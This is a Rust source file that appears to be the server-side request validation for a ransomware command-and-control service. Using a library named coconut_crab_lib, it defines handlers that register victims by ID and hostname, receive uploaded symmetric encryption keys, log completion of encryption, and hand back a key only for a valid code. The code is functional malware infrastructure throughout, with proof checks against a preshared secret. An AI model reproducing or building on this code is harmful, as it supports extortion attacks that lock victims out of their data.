use axum::{
    Json,
    body::Body,
    extract::{FromRequest, rejection::JsonRejection},
    http::{Request, StatusCode},
    response::{IntoResponse, Response},
};
use coconut_crab_lib::web::{
    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
    types::{Proof, VictimId},
    validate::{
        check_proof, validate_code, validate_hostname, validate_id, validate_key, validate_proof,
    },
};
use serde::de::DeserializeOwned;
use tracing::{debug, info, warn};

use crate::config;

#[derive(Debug)]
pub enum ApiError {
    InvalidJson,
    InvalidId,
    InvalidHostname,
    InvalidKey,
    InvalidCode,
    InvalidProofShape,
    InvalidProof,
    VictimExists,
    VictimNotFound,
    KeyNotUploaded,
    UnauthorizedCode,
    Database,
    TimeUnavailable,
    DecryptionFailed,
}

impl IntoResponse for ApiError {
    fn into_response(self) -> Response {
        let (status, body): (StatusCode, &'static str) = match self {
            Self::InvalidJson => (StatusCode::BAD_REQUEST, "Invalid JSON"),
            Self::InvalidId => (StatusCode::BAD_REQUEST, "Invalid ID"),
            Self::InvalidHostname => (StatusCode::BAD_REQUEST, "Invalid Hostname"),
            Self::InvalidKey => (StatusCode::BAD_REQUEST, "Invalid Key"),
            Self::InvalidCode => (StatusCode::BAD_REQUEST, "Invalid Code"),
            Self::InvalidProofShape => (StatusCode::BAD_REQUEST, "Invalid Proof"),
            Self::InvalidProof => (StatusCode::FORBIDDEN, "Invalid Proof"),
            Self::VictimExists => (StatusCode::CONFLICT, "Victim already exists"),
            Self::VictimNotFound => (StatusCode::NOT_FOUND, "Victim does not exist"),
            Self::KeyNotUploaded => (StatusCode::NOT_FOUND, "Key not uploaded"),
            Self::UnauthorizedCode => (StatusCode::FORBIDDEN, "Invalid Code"),
            Self::Database => (StatusCode::INTERNAL_SERVER_ERROR, "Database error"),
            Self::TimeUnavailable => (StatusCode::INTERNAL_SERVER_ERROR, "Time unavailable"),
            Self::DecryptionFailed => (StatusCode::INTERNAL_SERVER_ERROR, "Decryption failed"),
        };
        (status, body).into_response()
    }
}

#[derive(Debug)]
pub struct Validated<T>(pub T);

pub trait Provable: DeserializeOwned + Send {
    const LABEL: &'static str;
    fn id(&self) -> &VictimId;
    fn proof(&self) -> &Proof;
    fn proof_source(&self) -> Vec<u8>;
    fn validate_fields(&self) -> Result<(), ApiError>;
}

impl Provable for Registration {
    const LABEL: &'static str = "registration";

    fn id(&self) -> &VictimId {
        &self.id
    }

    fn proof(&self) -> &Proof {
        &self.proof
    }

    fn proof_source(&self) -> Vec<u8> {
        [self.id.as_bytes(), self.hostname.as_bytes()].concat()
    }

    fn validate_fields(&self) -> Result<(), ApiError> {
        if !validate_hostname(&self.hostname) {
            warn!(id = %self.id, hostname = %self.hostname, "Invalid hostname");
            return Err(ApiError::InvalidHostname);
        }
        Ok(())
    }
}

impl Provable for UploadSymKey {
    const LABEL: &'static str = "symmetric key upload";

    fn id(&self) -> &VictimId {
        &self.id
    }

    fn proof(&self) -> &Proof {
        &self.proof
    }

    fn proof_source(&self) -> Vec<u8> {
        [self.id.as_bytes(), self.key.as_bytes()].concat()
    }

    fn validate_fields(&self) -> Result<(), ApiError> {
        if !validate_key(self.key.as_str()) {
            warn!(id = %self.id, len = self.key.as_str().len(), "Invalid key");
            return Err(ApiError::InvalidKey);
        }
        Ok(())
    }
}

impl Provable for AnnounceCompletion {
    const LABEL: &'static str = "completion announcement";

    fn id(&self) -> &VictimId {
        &self.id
    }

    fn proof(&self) -> &Proof {
        &self.proof
    }

    fn proof_source(&self) -> Vec<u8> {
        self.id.as_bytes().to_vec()
    }

    fn validate_fields(&self) -> Result<(), ApiError> {
        Ok(())
    }
}

impl Provable for DownloadSymKey {
    const LABEL: &'static str = "symmetric key download";

    fn id(&self) -> &VictimId {
        &self.id
    }

    fn proof(&self) -> &Proof {
        &self.proof
    }

    fn proof_source(&self) -> Vec<u8> {
        [self.id.as_bytes(), self.code.as_bytes()].concat()
    }

    fn validate_fields(&self) -> Result<(), ApiError> {
        if !validate_code(self.code.as_str()) {
            warn!(id = %self.id, "Invalid code");
            return Err(ApiError::InvalidCode);
        }
        Ok(())
    }
}

fn ensure_id(id: &VictimId) -> Result<(), ApiError> {
    if !validate_id(id.as_str()) {
        warn!(%id, "Invalid ID");
        return Err(ApiError::InvalidId);
    }
    Ok(())
}

fn ensure_proof_shape(id: &VictimId, proof: &Proof) -> Result<(), ApiError> {
    if !validate_proof(proof.as_str()) {
        warn!(%id, "Invalid proof shape");
        return Err(ApiError::InvalidProofShape);
    }
    Ok(())
}

fn ensure_proof(id: &VictimId, proof_source: &[u8], proof: &Proof) -> Result<(), ApiError> {
    if !check_proof(proof_source, config::PRESHARED_SECRET, proof.as_str()) {
        warn!(%id, "Proof verification failure");
        return Err(ApiError::InvalidProof);
    }
    debug!(%id, "Proof verification success");
    Ok(())
}

impl<T: Provable, S: Send + Sync> FromRequest<S> for Validated<T>
where
    Json<T>: FromRequest<S, Rejection = JsonRejection>,
{
    type Rejection = ApiError;

    async fn from_request(req: Request<Body>, state: &S) -> Result<Self, Self::Rejection> {
        info!(label = T::LABEL, "Received request");
        let value: T = Json::<T>::from_request(req, state)
            .await
            .map(|Json(value)| value)
            .map_err(|error| {
                warn!(error = ?error, label = T::LABEL, "Failed to deserialize");
                ApiError::InvalidJson
            })?;
        ensure_id(value.id())?;
        value.validate_fields()?;
        ensure_proof_shape(value.id(), value.proof())?;
        let proof_source = value.proof_source();
        ensure_proof(value.id(), &proof_source, value.proof())?;
        Ok(Self(value))
    }
}
